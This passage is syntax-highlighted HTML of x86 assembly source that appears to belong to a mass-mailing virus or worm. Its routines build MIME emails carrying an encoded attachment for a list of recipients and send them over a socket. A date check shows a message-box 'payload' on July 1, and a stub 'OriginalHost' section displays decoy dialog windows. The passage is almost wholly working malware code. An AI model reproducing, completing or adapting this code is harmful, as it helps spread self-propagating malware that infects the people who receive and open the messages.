    </span><span class="sc5">EmailBody_EmailFrom</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">fromstatus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">EmailBody_MakeEmailFrom</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mimefrom_address</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mimefromsize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">email_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">EmailBody_EmailTo</span><span class="sc0">

    </span><span class="sc5">EmailBody_MakeEmailFrom</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">fromtag</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">email_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">fromaddress</span><span class="sc4">]</span><span class="sc0"> 
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11d</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">fromsize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11d</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">email_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc5">EmailBody_EmailTo</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">tostatus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">EmailBody_MakeEmailTo</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mimeto_address</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mimetosize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">email_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">EmailBody_EmailStartPart</span><span class="sc0">

    </span><span class="sc5">EmailBody_MakeEmailTo</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">totag</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">email_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">       

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">totalrcptsize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
        
    </span><span class="sc5">RcptStringLoop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">rcpt_size_address</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">rcpt_buffer_address</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">totalrcptsize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">email_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">totalrcptsize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">rcptnumber</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">RcptStringLoop</span><span class="sc0">

    </span><span class="sc5">EmailBody_EmailStartPart</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">emailstart</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">emailend</span><span class="sc4">-</span><span class="sc5">emailstart</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">email_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc5">EmailBody_EmailAttachement</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">dmHnd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">encodedsize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">email_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">   

    </span><span class="sc5">EmailBody_EmailEndPart</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">emailtail</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">17d</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">email_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">   

    </span><span class="sc5">EmailBody_EndTag</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">endtag</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">email_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc5">SendEmailBody</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">email_buffer_address</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">email_size</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SendCommand</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ReceiveReply</span><span class="sc0">

    </span><span class="sc5">MessageBoxDay</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">timedate</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AGetSystemTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">timedate.wMonth</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">SendError</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">timedate.wDay</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">SendError</span><span class="sc0">

    </span><span class="sc5">MessageBoxPayload</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0040h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">windowtitle</span><span class="sc4">]</span><span class="sc0">    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">msgmessage</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AMessageBox</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETUAPI</span><span class="sc0">    
    
    </span><span class="sc5">SendError</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-----------------------------[ send routine ]------------------------------;</span><span class="sc0">

    </span><span class="sc5">SendCommand</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">socketh</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ASend</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETWAPI</span><span class="sc0">
        
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">SendWentOk</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">SendCommand</span><span class="sc0">

     </span><span class="sc5">SendWentOk</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;--------------------------[ receive routine ]------------------------------;</span><span class="sc0">

     </span><span class="sc5">ReceiveReply</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc2">60</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">recvbuffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">socketh</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ARecv</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETWAPI</span><span class="sc0">                    </span><span class="sc1">; call the api</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ReceiveReply</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
</span><span class="sc5">SEND_MAIL</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;****************************************************************************;</span><span class="sc0">

    </span><span class="sc5">Leap</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">
 
    </span><span class="sc5">OriginalHost</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc0">               
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">hInst</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  

    </span><span class="sc5">CreateProgressWindow</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">                    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MYDIALOG_0</span><span class="sc0">              
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">                        
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">102</span><span class="sc0">                    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">hInst</span><span class="sc0">                      
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DialogBoxParamA</span><span class="sc0">                

    </span><span class="sc5">CreateMainWindow</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">                    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MYDIALOG_1</span><span class="sc0">              
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">                        
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">103</span><span class="sc0">                    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">hInst</span><span class="sc0">                      
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DialogBoxParamA</span><span class="sc0">                

    </span><span class="sc6">Leave</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc1">;============================[ ic-host_code.inc ]============================;</span><span class="sc0">

</span><span class="sc5">MYDIALOG_0</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">umsg</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wparam</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lparam</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">

    </span><span class="sc5">CheckParameter</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">umsg</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">WM_INITDIALOG</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">CenterDlg</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">umsg</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">WM_DESTROY</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">umsg</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">WM_CLOSE</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc0"> 
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">flag</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">CreateProgressThread</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">flag</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">CenterDlg</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dlgrect</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetWindowRect</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetDesktopWindow</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">desktoprect</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetWindowRect</span><span class="sc0">

